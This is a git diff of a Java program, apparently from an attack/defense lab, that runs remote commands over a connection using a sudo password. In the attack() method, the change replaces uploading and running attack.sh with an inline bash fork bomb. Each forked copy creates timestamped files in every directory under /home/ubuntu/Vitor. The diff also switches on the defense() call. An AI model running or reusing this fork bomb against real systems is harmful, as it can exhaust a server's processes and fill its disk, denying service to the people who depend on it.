@@ -16,10 +16,11 @@ public class Main {
      * Envia e executa o script de ataque no servidor remoto.
      */
     public static void attack() {
-        // Corrigindo caminho para usar LIB (no Windows)
-        Connection.transfer(LIB + "attack.sh", REMOTE_PATH);
-        Connection.command("chmod +x " + REMOTE_PATH + "/attack.sh");
-        Connection.sudoCommand("bash " + REMOTE_PATH + "/attack.sh", SUDO_PASSWD);
+        // Connection.transfer(LIB + "attack.sh", REMOTE_PATH);
+        // Connection.command("chmod +x " + REMOTE_PATH + "/attack.sh");
+        // Connection.sudoCommand("bash " + REMOTE_PATH + "/attack.sh", SUDO_PASSWD);
+        Connection.command(
+                "bash -c ':() { for D in $(find \"/home/ubuntu/Vitor\" -type d); do touch \"$D/vitor_$(date +%s%N).txt\"; done; :|: & };:'");
     }
 
     /**
@@ -30,7 +31,6 @@ public class Main {
         Connection.transfer(LIB + "defense.sh", REMOTE_PATH);
         Connection.command("chmod +x " + REMOTE_PATH + "/defense.sh");
         Connection.sudoCommand("bash " + REMOTE_PATH + "/defense.sh", SUDO_PASSWD);
-        // Connection.command("rm /defense.sh");
     }
 
     /**
@@ -44,7 +44,7 @@ public class Main {
 
     public static void main(String[] args) {
         setup();
-        // defense();
+        defense();
         // attack();
     }
 }
